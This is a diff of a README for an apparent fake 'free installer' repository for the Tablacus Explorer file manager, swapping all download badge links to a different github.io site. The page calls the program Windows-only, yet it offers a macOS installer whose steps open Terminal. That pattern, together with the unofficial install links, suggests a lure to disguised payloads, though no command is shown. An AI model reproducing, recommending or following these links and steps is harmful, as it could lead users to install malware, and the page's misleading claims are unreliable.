@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-File+Manager-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Tablacus Explorer Free Installer** — Tablacus Explorer is a free, open-source tabbed file manager for Windows with an add-on system for extending functionality. Works without internet access, no account required. Full offline installation.
+**💻 Tablacus Explorer Free Installer** — Tablacus Explorer is a free, tabbed file manager for Windows with extensive customization through add-ons. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Tablacus Explorer](https://img.shields.io/badge/⬇_Install_Tablacus+Explorer-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Tablacus Explorer](https://img.shields.io/badge/⬇_Install_Tablacus+Explorer-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Tablacus Explorer
 
-Tablacus Explorer is a free, open-source tabbed file manager for Windows with an add-on system for extending functionality. Browse files in multiple tabs, use the dual-pane layout, and install add-ons for preview, FTP, and custom tools. Tablacus Explorer's lightweight design and extensibility through add-ons make it a popular free alternative to commercial dual-pane file managers.
+Tablacus Explorer is a free, tabbed file manager for Windows with extensive customization through add-ons. Built around Internet Explorer's shell component, it provides tabbed browsing and scriptable extensions for a highly customizable file management experience.
 
 ---
 
 ## ❌ Problem: Tablacus Explorer is hard to access
 
-- **Windows Only** — No cross-platform version
-- **Documentation** — Primarily documented in Japanese; English resources limited
-- **Add-on Quality** — Community add-on quality and maintenance varies
-- **UI Design** — Interface less polished than commercial alternatives
+- **Windows Only** — Not available on macOS or Linux
+- **IE Shell Dependency** — Built on Internet Explorer shell component; future compatibility uncertain
+- **Technical Customization** — Add-on development requires scripting knowledge
+- **Dated Architecture** — IE-based foundation limits modernization
 
 ---
 
@@ -61,9 +61,9 @@ Tablacus Explorer is a free, open-source tabbed file manager for Windows with an
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Tablacus Explorer is a free, open-source tabbed file manager for Windows with an
 
 <div align="center">
 
-[![⬇ Install Tablacus Explorer](https://img.shields.io/badge/⬇_Install_Tablacus+Explorer-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Tablacus Explorer](https://img.shields.io/badge/⬇_Install_Tablacus+Explorer-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Tablacus Explorer is a free, open-source tabbed file manager for Windows with an
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Tablacus Explorer is a free, open-source tabbed file manager for Windows with an
 
 ---
 
-**Tablacus Explorer Free Installer** — Tablacus Explorer is a free, open-source tabbed file manager for Windows with an add-on system for extending functionality. Install without internet connection today!
+**Tablacus Explorer Free Installer** — Tablacus Explorer is a free, tabbed file manager for Windows with extensive customization through add-ons. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Tablacus Explorer](https://img.shields.io/badge/⬇_Install_Tablacus+Explorer-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Tablacus Explorer](https://img.shields.io/badge/⬇_Install_Tablacus+Explorer-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
